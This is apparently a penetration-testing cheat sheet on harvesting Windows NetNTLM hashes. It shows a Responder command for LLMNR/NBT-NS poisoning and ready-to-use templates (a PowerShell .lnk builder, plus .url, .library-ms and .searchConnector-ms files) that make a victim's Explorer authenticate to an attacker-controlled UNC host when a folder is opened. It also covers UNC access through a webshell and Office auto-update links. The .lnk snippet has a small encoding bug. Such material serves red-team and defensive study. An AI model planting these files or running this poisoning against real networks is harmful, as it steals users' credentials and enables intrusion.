# Hash Collection

### Responder

Responder can usually be used if we control a linux machine with root privileges on the same network/subnet as the target system. It will try to spoof/poison in order to collect hashes over several protocols. A common attack technique responder automatically executes is LLMNR/NBTNS poisoning.

[https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)

```bash
python Responder.py -i <interface>
```

Make sure to edit the config file to specify which hosts to respond to as it might get messy responding to all hosts.

### Smbserver.py

### Forcing Authentication

#### Windows Shortcuts \(.lnk\)

Triggered on opening the containing folder in explorer.

```text
$cmd= 'Start-Process c:\windows\tasks\<payload>'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encodedCommand = [Convert]::ToBase64String($cmd)
$obj = New-object -comobject wscript.shell
$link = $obj.createshortcut("<targetpath>")
$link.windowstyle = "7"
$link.targetpath = "..."
$link.iconlocation = "\\<ip>@port\share\file"
$link.arguments = "<arguments>"
$link.save()
```

Or using crop from the [farmer-toolkit](https://github.com/mdsecactivebreach/Farmer).

#### URL files \(.url\)

Triggered on opening the containing folder in explorer.

```text
[InternetShortcut]
URL=test
WorkingDirectory=test
IconFile=\\\\ip@port\\%USERNAME%.icon
IconIndex=1
```

#### Windows Library Files \(.library-ms\)

Triggered on opening the containing folder in explorer.

```text
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="<http://schemas.microsoft.com/windows/2009/library>">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>\\\\<ip>@<port>\\data</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

#### Windows Search Connectors \(.searchConnector-ms\)

```text
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="<http://schemas.microsoft.com/windows/2009/searchConnector>">
    <iconReference>imageres.dll,-1002</iconReference>
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <iconReference>\\\\workstation@8888\\mdsec.ico</iconReference>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>\\\\<ip>@<port>\\data</url>
    </simpleLocation>
</searchConnectorDescription>
```

#### Autoupading links in Office Files

See [Fertilizer](https://github.com/mdsecactivebreach/Farmer). This is especially nice becauser no matter if the user clicks yes or no on the warning message, it will still send the hash.

#### Direct UNC Path Access

In case a webshell or similar exists we can just call an UNC path directly e.g.:

```text
\\<ip>\share\file
```

Note that if you want to actually have a successful authentication here to retrieve a file, null sessions must either be enabled on the victim \(which is not default\) or you need to have the correct user configured on your end \(the one windows is using to authenticate as\).

### References

[https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/)

